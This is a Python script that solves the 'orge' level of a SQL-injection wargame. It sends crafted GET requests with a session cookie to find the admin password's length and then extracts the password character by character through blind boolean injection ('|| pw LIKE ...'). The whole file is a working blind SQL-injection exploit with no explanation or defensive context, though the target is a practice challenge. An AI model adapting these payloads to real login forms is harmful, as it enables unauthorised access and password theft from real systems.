import requests

url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"


def get_pw_length(cookie):
    cookie_header = {"PHPSESSID": cookie}

    for i in range(1, 20):
        query = "?pw=' || id='admin' %26%26 LENGTH(pw)={} %23".format(str(i))
        request = url + query

        response = requests.get(request, cookies=cookie_header)
        if response.text.find("<h2>Hello admin</h2>") > 0:
            print(i)
            return i


def injection(cookie, length):
    cookie_header = {"PHPSESSID": cookie}
    result = ""

    char_list = "qwertyuiopasdfghjklzxcvbnmm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"

    for i in range(length + 1):
        for x in char_list:
            query = "?pw=0' || pw LIKE '" + result + x + "%' %23"
            request = url + query

            response = requests.get(request, cookies=cookie_header)
            if response.text.find("<h2>Hello admin</h2>") > 0:
                result += x
                print(result)
                break

            elif response.text.find("ORGE") > 0:
                print(result)
                return result

if __name__ == '__main__':
    cookie = ""
    length = get_pw_length(cookie)
    injection(cookie, length)
